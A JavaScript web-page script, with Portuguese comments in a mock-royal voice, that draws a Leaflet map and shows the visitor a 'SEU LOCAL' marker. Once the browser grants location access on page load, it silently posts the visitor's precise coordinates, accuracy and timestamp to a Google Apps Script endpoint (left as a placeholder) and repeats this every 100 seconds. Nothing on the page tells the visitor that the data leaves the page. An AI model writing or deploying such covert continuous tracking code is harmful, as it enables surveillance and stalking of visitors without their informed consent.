$(document).ready(function () {

    // MAPA DO TERRITÓRIO REAL
    var map = L.map('map', {
        scrollWheelZoom: false
    }).setView([-23.4866, -46.3487], 16);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19
    }).addTo(map);

    // FUNÇÃO PARA CAPTURAR E ENVIAR OS DADOS DO SÚDITO
    function capturarLocalizacaoReal() {
        if (!navigator.geolocation) {
            console.error("Alerta Real: Este navegador é indigno e não possui GPS.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function(position) {
                // Coordenadas reais do GPS
                var lat = position.coords.latitude;
                var lng = position.coords.longitude;

                // Marker e popup permanecem para visualização
                var marker = L.marker([lat, lng])
                    .addTo(map)
                    .bindPopup("SEU LOCAL")
                    .openPopup();

                // Centraliza mapa na posição do marker
                map.setView([lat, lng], 17);

                // PEGAMOS EXATAMENTE DO PIN
                var pinLat = marker.getLatLng().lat;
                var pinLng = marker.getLatLng().lng;

                // Envio direto para o Google Sheets
                const dados = {
                    timestamp: new Date().toISOString(),
                    latitude: pinLat,
                    longitude: pinLng,
                    precisao: position.coords.accuracy,
                    status: navigator.onLine ? 'online' : 'offline'
                };

                fetch('SUA_URL_DO_APPS_SCRIPT_AQUI', {
                    method: 'POST',
                    mode: 'no-cors', // evita CORS
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                }).then(() => console.log("Dados do pin enviados com sucesso."));

            },
            function(error) {
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        console.error("O súdito negou o acesso à localização, Majestade!");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        console.error("O sinal de GPS está fraco nas fronteiras.");
                        break;
                    case error.TIMEOUT:
                        console.error("A requisição expirou no tempo de espera real.");
                        break;
                    default:
                        console.error("Erro desconhecido na geolocalização.");
                }
            },
            { enableHighAccuracy: true, timeout: 10000 } // máxima precisão
        );
    }

    // DISPARO AUTOMÁTICO AO CARREGAR A PÁGINA
    capturarLocalizacaoReal();

    // RASTREIO CONTÍNUO A CADA 100 SEGUNDOS
    setInterval(capturarLocalizacaoReal, 100000);

});
